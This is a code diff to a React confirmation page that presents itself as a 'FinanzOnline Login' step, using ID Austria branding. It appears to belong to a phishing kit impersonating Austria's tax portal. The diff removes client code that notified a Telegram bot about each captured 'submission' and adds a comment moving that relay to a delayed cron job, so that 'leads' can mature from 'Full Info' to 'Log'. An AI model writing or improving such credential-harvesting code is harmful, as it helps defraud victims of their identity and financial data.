@@ -1,9 +1,7 @@
-import { useEffect, useRef } from "react";
-import { useSearchParams } from "react-router-dom";
+import { useEffect } from "react";
 import Header from "@/components/Header";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { CheckCircle, Check } from "lucide-react";
-import { supabase } from "@/integrations/supabase/client";
 
 import idAustriaImg from "@/assets/IDAustria.png";
 import finanznaviImg from "@/assets/Finanznavi.jpg";
@@ -21,29 +19,11 @@ const confirmationItems = [
 ];
 
 const Confirmation = () => {
-  const [searchParams] = useSearchParams();
-  const sessionId = searchParams.get("s");
-  const notified = useRef(false);
-
   usePageMeta("FinanzOnline Login", "/favicon.png");
   useEffect(() => { window.scrollTo(0, 0); }, []);
 
-  useEffect(() => {
-    if (!sessionId || notified.current) return;
-    notified.current = true;
-    supabase
-      .from("submissions")
-      .select("id")
-      .eq("session_id", sessionId)
-      .single()
-      .then(({ data }) => {
-        if (data) {
-          supabase.functions.invoke("notify-telegram", {
-            body: { submission_id: data.id, kind: "log" },
-          }).catch(() => {});
-        }
-      });
-  }, [sessionId]);
+  // Telegram-Versand wird ausschließlich vom pg_cron Job nach 5 Minuten erledigt.
+  // So bekommen Leads Zeit, vom Full Info zum Log zu werden, bevor gesendet wird.
 
   return (
     <div className="min-h-screen bg-white">
